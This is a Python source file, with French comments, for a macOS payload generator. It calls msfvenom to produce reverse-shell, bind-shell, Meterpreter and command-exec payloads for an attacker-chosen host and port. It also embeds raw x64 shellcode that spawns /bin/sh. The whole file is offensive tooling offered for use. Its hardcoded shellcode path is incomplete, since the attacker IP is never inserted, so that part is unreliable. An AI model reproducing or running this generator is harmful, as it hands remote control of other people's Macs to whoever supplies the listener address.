#!/usr/bin/env python3
"""
macOS Mach-O Payload Generator
- Reverse shells for macOS
- Bind shells
- Meterpreter for macOS
"""

import struct
from typing import Optional

class MacOSPayloads:
    """
    Générateur de payloads macOS (Mach-O)
    """
    
    MSF_PAYLOADS = {
        'reverse_tcp': 'osx/x64/shell_reverse_tcp',
        'reverse_tcp_x86': 'osx/x86/shell_reverse_tcp',
        'bind_tcp': 'osx/x64/shell_bind_tcp',
        'meterpreter': 'osx/x64/meterpreter/reverse_tcp',
        'exec': 'osx/x64/exec',
    }
    
    def __init__(self, use_msf: bool = True):
        self.use_msf = use_msf
    
    def reverse_tcp_x64(self, lhost: str, lport: int) -> bytes:
        """
        Reverse shell TCP pour macOS x64
        """
        if self.use_msf:
            return self._use_msfvenom('reverse_tcp', lhost, lport)
        
        # Shellcode macOS x64 basique
        ip_bytes = socket.inet_aton(lhost)
        
        shellcode = (
            b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
            b"\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x01\x58\x0f\x05\x49"
            b"\x89\xc4\x48\x31\xc0\x48\x89\xc7\x48\x89\xe6\x48\x31\xd2\x6a"
            b"\x10\x5a\x4c\x89\xe7\xb0\x2a\x0f\x05\x4c\x89\xe7\x48\x31\xf6"
            b"\x6a\x03\x5e\x48\xff\xce\x6a\x2a\x58\x0f\x05\x75\xf6\x48\x31"
            b"\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89"
            b"\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
        )
        
        # Remplacer l'adresse IP (simplifié)
        # Version complète nécessite modification précise du shellcode
        
        return shellcode
    
    def bind_tcp(self, lport: int) -> bytes:
        """
        Bind shell TCP pour macOS
        """
        if self.use_msf:
            return self._use_msfvenom('bind_tcp', '', lport)
        return b""
    
    def exec(self, cmd: str) -> bytes:
        """
        Exécute une commande
        """
        if self.use_msf:
            return self._use_msfvenom_with_option('exec', 'CMD', cmd)
        return b""
    
    def meterpreter_reverse_tcp(self, lhost: str, lport: int) -> bytes:
        """
        Meterpreter pour macOS
        """
        if self.use_msf:
            return self._use_msfvenom('meterpreter', lhost, lport)
        return b""
    
    def _use_msfvenom(self, payload_key: str, lhost: str, lport: int) -> bytes:
        """Utilise msfvenom"""
        import subprocess
        
        payload = self.MSF_PAYLOADS.get(payload_key, payload_key)
        cmd = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', 'raw']
        
        try:
            result = subprocess.run(cmd, capture_output=True, check=True)
            return result.stdout
        except:
            return b""
    
    def _use_msfvenom_with_option(self, payload_key: str, option: str, value: str) -> bytes:
        """Utilise msfvenom avec options"""
        import subprocess
        
        payload = self.MSF_PAYLOADS.get(payload_key, payload_key)
        cmd = ['msfvenom', '-p', payload, f'{option}={value}', '-f', 'raw']
        
        try:
            result = subprocess.run(cmd, capture_output=True, check=True)
            return result.stdout
        except:
            return b""


import socket